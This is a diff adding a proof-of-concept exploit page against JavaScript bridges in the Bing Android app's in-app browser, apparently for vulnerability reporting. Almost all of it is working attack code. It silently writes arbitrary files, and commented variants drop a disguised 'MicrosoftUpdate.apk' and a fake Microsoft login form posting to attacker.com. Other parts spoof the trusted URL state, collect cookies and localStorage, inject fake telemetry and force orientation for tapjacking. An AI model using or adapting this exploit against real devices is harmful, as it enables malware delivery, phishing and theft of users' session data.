@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>MS Bing IAB Bridge PoC — Arbitrary File Write</title>
+  <script type="text/javascript">
+    window.onload = function() {
+
+      // ---------------------------------------------------------------
+      // PRIMARY EXPLOIT: Arbitrary file write via saveBase64ToImageFile
+      // ---------------------------------------------------------------
+
+      // Payload: any content — text, APK bytes, HTML, shell script, etc.
+      var content = 'Arbitrary write file poc!';
+      var base64  = btoa(content);
+
+      // url parameter drives URLUtil.guessFileName() — controls output filename
+      var url                = 'https://attacker.com/poc.txt';
+      var contentDisposition = 'attachment; filename="poc.txt"';
+      var mimeType           = 'text/plain';
+
+      // --- APK delivery variant (swap above three lines) ---
+      // var url                = 'https://attacker.com/update.apk';
+      // var contentDisposition = 'attachment; filename="MicrosoftUpdate.apk"';
+      // var mimeType           = 'application/vnd.android.package-archive';
+
+      // --- HTML phishing page variant ---
+      // var content            = '<html><body><h1>Sign in to Microsoft</h1>'
+      //                        + '<form action="https://attacker.com/steal">'
+      //                        + '<input name="pass" type="password"/>'
+      //                        + '<input type="submit"/></form></body></html>';
+      // var base64             = btoa(content);
+      // var url                = 'https://attacker.com/login.html';
+      // var contentDisposition = 'attachment; filename="login.html"';
+      // var mimeType           = 'text/html';
+
+      if (window.iabSDKJSBridge && window.iabSDKJSBridge.saveBase64ToImageFile) {
+        // Writes payload to /sdcard/Download/poc.txt silently — no user prompt,
+        // no permission dialog, no confirmation. File immediately visible to
+        // all apps via MediaScannerConnection.scanFile().
+        window.iabSDKJSBridge.saveBase64ToImageFile(
+          base64,
+          url,
+          contentDisposition,
+          mimeType
+        );
+        document.getElementById('primary').innerText =
+          '[+] saveBase64ToImageFile called — file written to /sdcard/Download/poc.txt';
+      } else {
+        document.getElementById('primary').innerText =
+          '[-] iabSDKJSBridge not present on this page';
+      }
+
+      // ---------------------------------------------------------------
+      // SECONDARY EXPLOIT: URL state spoofing via onLoadUrlChanged
+      // ---------------------------------------------------------------
+      // Overwrites InAppBrowserWebView.h — the internal "current URL" field.
+      // Used by canGoBack(), onReceivedError(), onReceivedSslError() to make
+      // security decisions. Spoofing this to a trusted Microsoft domain can
+      // suppress SSL error dialogs or cause incorrect back-stack behavior.
+      if (window.iabSDKJSBridge && window.iabSDKJSBridge.onLoadUrlChanged) {
+        window.iabSDKJSBridge.onLoadUrlChanged(
+          'https://login.microsoft.com/spoofed-by-attacker'
+        );
+        document.getElementById('secondary').innerText =
+          '[+] onLoadUrlChanged called — internal URL state spoofed to login.microsoft.com';
+      }
+
+      // ---------------------------------------------------------------
+      // TERTIARY EXPLOIT: Data exfiltration via saTextSelBridge.callback
+      // ---------------------------------------------------------------
+      // Originally designed to relay user-selected text from news articles.
+      // An attacker page can call this with any string — including cookies,
+      // localStorage tokens, or any data accessible from the page context.
+      // The data is posted into the native app's main thread Handler chain.
+      if (window.saTextSelBridge && window.saTextSelBridge.callback) {
+        var exfilData = 'cookie=' + document.cookie
+                      + '|storage=' + JSON.stringify(localStorage)
+                      + '|origin=' + window.location.origin;
+        window.saTextSelBridge.callback(
+          exfilData,                    // selectedText — [ATTACKER-CONTROLLED]
+          'Microsoft Bing News Article' // title       — [ATTACKER-CONTROLLED]
+        );
+        document.getElementById('tertiary').innerText =
+          '[+] saTextSelBridge.callback called — data posted to native handler: '
+          + exfilData;
+      }
+
+      // ---------------------------------------------------------------
+      // QUATERNARY EXPLOIT: Telemetry poisoning via logEvent
+      // ---------------------------------------------------------------
+      // Injects fabricated telemetry events into Microsoft's analytics pipeline.
+      // All JSON fields except "name" (overwritten to "IAB_LOG_EVENT") are
+      // fully attacker-controlled.
+      if (window.iabSDKJSBridge && window.iabSDKJSBridge.logEvent) {
+        var fakeEvent = JSON.stringify({
+          eventType:   'purchase_complete',
+          userId:      'victim_spoofed_id_12345',
+          articleId:   'attacker_controlled_article',
+          revenue:     '999.99',
+          currency:    'USD',
+          campaign:    'attacker_campaign_injection',
+          timestamp:   new Date().toISOString()
+        });
+        window.iabSDKJSBridge.logEvent(fakeEvent);
+        document.getElementById('quaternary').innerText =
+          '[+] logEvent called — fabricated telemetry injected: ' + fakeEvent;
+      }
+
+      // ---------------------------------------------------------------
+      // QUINARY EXPLOIT: Forced orientation via requestOrientation
+      // ---------------------------------------------------------------
+      // Forces device screen orientation — can be used as part of a
+      // UI redressing / tapjacking attack to position overlay UI elements.
+      if (window.iabSDKJSBridge && window.iabSDKJSBridge.requestOrientation) {
+        window.iabSDKJSBridge.requestOrientation(
+          JSON.stringify({ orientation: 'landscape' })
+        );
+        document.getElementById('quinary').innerText =
+          '[+] requestOrientation called — device forced to landscape';
+      }
+
+    }; // end window.onload
+  </script>
+</head>
+<body style="font-family:monospace; padding:20px; background:#111; color:#0f0;">
+  <h2 style="color:#f00;">MS Bing InAppBrowserWebView — JS Bridge PoC</h2>
+  <p style="color:#ff0;">
+    CVE: CWE-749 — Exposed Dangerous Method via addJavascriptInterface()<br/>
+    Target: com.microsoft.bing / InAppBrowserWebView<br/>
+    Bridges: iabSDKJSBridge (dbc), saTextSelBridge (w7p)
+  </p>
+  <hr style="border-color:#333;"/>
+
+  <h3 style="color:#0ff;">[1] Primary — Arbitrary File Write</h3>
+  <p id="primary" style="color:#0f0;">Waiting...</p>
+
+  <h3 style="color:#0ff;">[2] Secondary — URL State Spoofing</h3>
+  <p id="secondary" style="color:#0f0;">Waiting...</p>
+
+  <h3 style="color:#0ff;">[3] Tertiary — Data Exfiltration via saTextSelBridge</h3>
+  <p id="tertiary" style="color:#0f0;">Waiting...</p>
+
+  <h3 style="color:#0ff;">[4] Quaternary — Telemetry Poisoning via logEvent</h3>
+  <p id="quaternary" style="color:#0f0;">Waiting...</p>
+
+  <h3 style="color:#0ff;">[5] Quinary — Forced Orientation via requestOrientation</h3>
+  <p id="quinary" style="color:#0f0;">Waiting...</p>
+
+  <hr style="border-color:#333;"/>
+  <p style="color:#888; font-size:11px;">
+    Trigger via: adb shell am start -a android.intent.action.VIEW \<br/>
+    &nbsp;&nbsp;-d "https://attacker.com/poc.html" \<br/>
+    &nbsp;&nbsp;com.microsoft.bing/com.microsoft.sapphire.app.browser.IntentDispatchActivity
+  </p>
+</body>
+</html>
